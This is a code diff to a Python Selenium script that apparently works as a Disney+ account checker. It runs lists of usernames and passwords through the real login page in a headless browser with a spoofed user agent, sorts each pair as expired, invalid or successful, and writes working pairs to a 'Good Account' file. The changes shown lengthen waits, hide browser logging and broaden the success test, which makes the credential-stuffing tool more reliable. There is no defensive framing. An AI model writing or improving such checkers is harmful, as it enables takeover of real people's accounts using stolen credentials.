@@ -27,6 +27,7 @@ def disney():
     browser_options = Options()
     browser_options.add_argument(
         'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
+    browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
     browser_options.add_argument("--headless=new")
     os.makedirs(plain_directory + '/accounts', exist_ok=True)
     index = 0
@@ -38,7 +39,7 @@ def disney():
                 browser = webdriver.Chrome(options=browser_options)
                 browser.set_window_size(200,200)
                 browser.get(page)
-                time.sleep(6)
+                time.sleep(10)
                 if browser.find_elements(By.XPATH, '//*[@id="onetrust-reject-all-handler"]'):
                     gdpr_reject_all = browser.find_element(By.XPATH, '//*[@id="onetrust-reject-all-handler"]')
                     gdpr_reject_all.click()
@@ -60,7 +61,7 @@ def disney():
                     time.sleep(2)
                     login_button = browser.find_element(By.XPATH, '//*[@id="password-continue-login"]')
                     login_button.click()
-                    time.sleep(5)
+                    time.sleep(7)
                     login_process_complete = True
                 if browser.find_elements(By.XPATH, '//*[@id="section_index"]/div/div[2]/div/button'):
                     print(" | {}:{} ---> Subscription Expired".format(users[index], passwords[index]))
@@ -73,7 +74,7 @@ def disney():
                     time.sleep(5)
                     if browser.find_elements(By.XPATH, '//*[@id="password__error"]'):
                         print(" | {}:{} ---> Invalid Password".format(users[index], passwords[index]))
-                    if browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section'):
+                    if browser.find_elements(By.XPATH, '//*[@id="remove-main-padding_index"]/div/div/section') or 'home' in browser.current_url:
                         print(" | {}:{} ---> Success!".format(users[index], passwords[index]))
                         account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))
                 index += 1
